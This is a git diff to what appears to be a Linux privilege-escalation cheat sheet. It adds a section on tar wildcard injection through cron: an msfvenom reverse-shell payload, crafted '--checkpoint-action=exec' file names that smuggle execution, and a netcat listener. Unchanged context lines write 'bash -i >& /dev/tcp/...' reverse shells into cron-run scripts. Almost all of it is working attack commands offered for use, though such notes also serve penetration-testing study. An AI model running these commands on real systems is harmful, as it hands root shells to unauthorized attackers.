@@ -115,7 +115,7 @@ echo '* * * * * root overwrite.sh' >> /etc/crontab
 echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
 echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
 ```
-#### Cron Jobs - PATH Environment Variable 🔆
+#### Cron Jobs - PATH Environment Variable 
 ```bash
 # Check "PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" code in crontab file.
 # If there is a writable directory in "PATH=", inside that directory we create a file with the same name as "overwrite.sh" file and write reverseshell inside it.
@@ -123,7 +123,14 @@ echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
 echo '#!/bin/bash' > /home/user/overwrite.sh
 echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /home/user/overwrite.sh
 ```
-
+#### Cron Jobs - Wildcards 🔆
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # our kali
+chmod +x /home/user/shell.elf # target machine
+touch /home/user/--checkpoint=1 # target machine
+touch /home/user/--checkpoint-action=exec=shell.elf # target machine
+nc -nvlp 4444 # our kali
+```
 #### The following list shows the most commons file extensions for linux:
 ```bash
 .a   : a static library ;
